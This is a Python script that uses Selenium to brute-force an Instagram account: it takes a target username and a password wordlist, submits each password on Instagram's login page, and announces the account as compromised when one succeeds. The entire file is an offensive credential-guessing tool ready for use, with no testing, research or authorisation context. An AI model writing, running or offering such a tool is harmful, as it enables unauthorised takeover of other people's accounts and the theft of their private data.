from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import time
import os

def instagram_login(username, password, chromedriver_path):
    try:
        driver = webdriver.Chrome(executable_path=chromedriver_path)
        driver.get("https://www.instagram.com/accounts/login/")
        try:
            username_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            username_input.send_keys(username)
            password_input = driver.find_element(By.NAME, "password")
            password_input.send_keys(password)

            login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()

            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//a[@href='/{}/']/img".format(username))) or
                EC.presence_of_element_located((By.ID, "slfErrorAlert"))
            )

            if driver.current_url == "https://www.instagram.com/":
                print(f"Successfully logged in with password: {password}")
                return True
            else:
                print(f"Login failed with password: {password}")
                return False

        except TimeoutException:
            print("Timeout occurred. Element not found.")
            return False

        finally:
            driver.quit()
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        return False

def bruteforce(username, password_list, chromedriver_path):
    for password in password_list:
        if instagram_login(username, password, chromedriver_path):
            print(f"Password found: {password}")
            return password
    print("Password not found in the given list.")
    return None

if __name__ == "__main__":
    username = input("Enter the Instagram username: ")
    password_file = input("Enter the path to the password list file: ")
    chromedriver_path = input("Enter the path to chromedriver.exe: ")

    if not os.path.exists(chromedriver_path):
        print("Error: The specified chromedriver.exe file does not exist.")
        exit(1)

    try:
        with open(password_file, 'r') as f:
            password_list = [line.strip() for line in f]
    except FileNotFoundError:
        print("Error: The specified password list file does not exist.")
        exit(1)

    result = bruteforce(username, password_list, chromedriver_path)

    if result:
        print(f"The account has been compromised. Password: {result}")
    else:
        print("The account is secure against the provided password list.")
